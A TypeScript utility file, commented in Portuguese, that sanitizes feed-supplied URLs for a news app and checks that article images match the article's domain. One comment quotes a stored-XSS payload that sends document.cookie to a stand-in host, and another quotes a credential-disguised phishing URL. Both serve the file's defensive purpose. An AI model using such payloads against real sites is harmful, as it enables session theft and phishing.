/**
 * Valida uma URL externa antes de guardá-la ou de renderizá-la como `href`.
 *
 * O React NÃO sanitiza `href`. `articles.url` vem do `<link>` de um feed RSS —
 * conteúdo de terceiro — e é renderizado como link clicável em quatro telas.
 * Um item de feed com `<link>javascript:fetch('//x/'+document.cookie)</link>`
 * vira XSS armazenado, executado na origem do próprio app, com um clique do
 * operador. `rel="noreferrer"` e `target="_blank"` não ajudam em nada nisso.
 *
 * Aplicado em duas camadas de propósito: na ingestão (impede a entrada de novas
 * linhas ruins) e na renderização (as linhas já gravadas não são limpas
 * retroativamente por uma correção só na ingestão).
 *
 * @param raw  a URL como veio do terceiro
 * @param base URL base para resolver formas relativas ao protocolo (`//host/x`),
 *             que aparecem legitimamente em alguns feeds. Sem base, essas são
 *             descartadas.
 */
export function safeExternalUrl(raw: unknown, base?: string): string | null {
  if (typeof raw !== 'string') return null
  const trimmed = raw.trim()
  if (!trimmed) return null

  let parsed: URL
  try {
    parsed = base ? new URL(trimmed, base) : new URL(trimmed)
  } catch {
    return null
  }

  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
  // Credenciais embutidas servem para disfarçar o host real de quem lê o link
  // ("https://portal.gov.br@evil.com"). Nunca são legítimas num link de notícia.
  if (parsed.username || parsed.password) return null
  return parsed.href
}

// CDNs genéricos que servem a imagem da própria matéria em outro domínio.
const IMAGE_CDN_HOSTS = /(^|\.)(wp\.com|cloudfront\.net|akamaized\.net|glbimg\.com|uol\.com\.br|ebc\.com\.br|cdninstagram\.com|twimg\.com)$/i

function mainLabel(host: string): string {
  const parts = host.replace(/^www\./, '').split('.')
  // "poder360.com.br" → "poder360"; "g1.globo.com" → "globo"
  const tld = parts.slice(-2).join('.')
  return (/^(com|gov|org|net|edu)\.br$/.test(tld) ? parts[parts.length - 3] : parts[parts.length - 2]) || host
}

/**
 * Imagem só aparece quando é da matéria: mesmo domínio-base do link ou CDN
 * conhecido. Imagem de outro site (agregador, banco de imagem genérico) dava
 * foto de outro assunto no card.
 */
export function articleImageMatches(imageUrl: string | null | undefined, articleUrl: string | null | undefined): boolean {
  if (!imageUrl || !articleUrl) return false
  try {
    const image = new URL(imageUrl).hostname
    const article = new URL(articleUrl).hostname
    if (/news\.google\.com$/.test(article)) return false
    return mainLabel(image) === mainLabel(article) || IMAGE_CDN_HOSTS.test(image)
  } catch {
    return false
  }
}
